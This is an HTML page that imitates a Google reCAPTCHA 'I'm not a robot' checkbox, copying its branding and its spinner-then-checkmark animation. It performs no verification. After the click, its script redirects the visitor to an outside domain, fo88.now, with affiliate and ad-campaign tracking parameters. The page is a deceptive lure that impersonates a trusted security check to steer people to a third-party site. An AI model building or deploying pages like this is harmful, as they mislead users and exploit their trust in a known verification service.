<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin:0;
  background:#f9f9f9;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  font-family:Arial, sans-serif;
}

.captcha-box {
  border:1px solid #d3d3d3;
  background:#fff;
  padding:12px;
  border-radius:6px;
  width:90%;
  max-width:280px;
  box-sizing:border-box;
}

.captcha-row {
  display:flex;
  align-items:center;
  cursor:pointer;
}

.checkbox {
  width:22px;
  height:22px;
  border:2px solid #555;
  margin-right:10px;
  position:relative;
  flex-shrink:0;
}

.spinner {
  width:18px;
  height:18px;
  border:3px solid #ccc;
  border-top:3px solid #4285F4;
  border-radius:50%;
  animation:spin 1s linear infinite;
  position:absolute;
  top:1px;
  left:1px;
  display:none;
}

@keyframes spin {
  100% { transform: rotate(360deg); }
}

.checkmark {
  display:none;
  color:white;
  background:#34A853;
  width:100%;
  height:100%;
  text-align:center;
  line-height:22px;
  font-size:14px;
  font-weight:bold;
}

.logo {
  font-size:11px;
  color:#777;
  margin-top:8px;
  text-align:right;
}

/* 📱 Mobile tối ưu thêm */
@media (max-width: 480px){
  .captcha-box{
    padding:10px;
  }
}
</style>
</head>

<body>

<div class="captcha-box">
  <div class="captcha-row" onclick="verify()">
    <div class="checkbox">
      <div class="spinner" id="spinner"></div>
      <div class="checkmark" id="check">✔</div>
    </div>
    <span style="font-size:14px;">I’m not a robot</span>
  </div>

  <div class="logo">reCAPTCHA<br><small>Privacy - Terms</small></div>
</div>

<script>
let done = false;

function verify(){
  if(done) return;

  let spinner = document.getElementById("spinner");
  let check = document.getElementById("check");

  spinner.style.display = "block";

  setTimeout(()=>{
    spinner.style.display = "none";
    check.style.display = "block";
    done = true;

    setTimeout(()=>{
      window.location.href = "https://fo88.now/?a=b971015ae66a56560fa66a755b407c2c&utm_campaign=googleads&utm_source=inhouse&utm_medium=search&utm_term=%7Bkeyword%7D&utm_content=mainsite";
    }, 1000);

  }, 1500);
}
</script>

</body>
</html>
